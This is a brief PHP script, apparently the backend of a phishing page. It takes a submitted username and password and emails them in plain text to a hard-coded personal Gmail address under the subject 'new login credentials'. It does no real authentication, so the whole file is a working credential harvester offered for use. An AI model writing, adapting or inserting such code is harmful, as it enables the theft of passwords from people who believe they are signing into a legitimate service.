<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    $username = $data['username'] ?? '';
    $password = $data['password'] ?? '';

    if (empty($username) || empty($password)) {
        echo json_encode(['success' => false, 'message' => 'Username or password is missing']);
        exit;
    }

    $to = 'fahd9fahdelhajli@gmail.com';
    $subject = 'Nouveaux identifiants de connexion';
    $message = "Identifiant: $username\nMot de passe: $password";
    $headers = 'From: fahd9fahdelhajli@gmail.com' . "\r\n" .
               'Reply-To: fahd9fahdelhajli@gmail.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    if (mail($to, $subject, $message, $headers)) {
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'message' => 'Failed to send email']);
    }
} else {
    echo json_encode(['success' => false, 'message' => 'Invalid request method']);
}
?>
